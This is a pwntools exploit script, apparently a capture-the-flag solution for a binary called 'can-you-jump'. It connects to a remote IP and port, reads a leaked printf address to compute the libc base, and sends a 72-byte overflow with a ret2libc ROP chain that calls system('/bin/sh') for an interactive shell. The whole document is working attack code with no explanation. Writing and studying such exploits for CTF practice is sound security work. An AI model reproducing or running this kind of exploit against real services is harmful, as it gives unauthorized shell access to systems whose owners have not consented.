from pwn import *
elf = ELF('/home/kali/Downloads/canyoujump/can-you-jump')
p = elf.process()
p=remote('34.179.139.43', 30485)

#gdb.attach(p, gdbscript='b* 0x0400773')



#local offsts
printf_offset = 0x31900
system_offset = 0x2b110
binsh_offset = 0x17fea4



#2.27 offsts
printf_offset = 0x64f70
system_offset = 0x4f550
binsh_offset = 0x1b3e1a


pop_rdi_ret = p64(0x0400773)
ret = p64(0x0400291)

libc_pop_rdi_ret_offset = 0x215bf
libc_ret_offset = 0xc22ec

main = p64(0x4006D7)

#read leaked printf

p.recvuntil(b": ")

printf = int(p.recvline().strip(), 16)
print(hex(printf))

libc = printf - printf_offset
print(hex(libc))


system = libc + system_offset 
binsh = libc + binsh_offset
pop_rdi_ret = libc + libc_pop_rdi_ret_offset
ret = libc + libc_ret_offset

print(hex(system))

#padding to rbp (64)
payload = b'\x90' * 64
#rbp
payload += b'\x90' * 8


payload += ( p64(pop_rdi_ret) + p64(binsh)+ p64(ret)  + p64(system))




p.send(payload)



p.interactive()
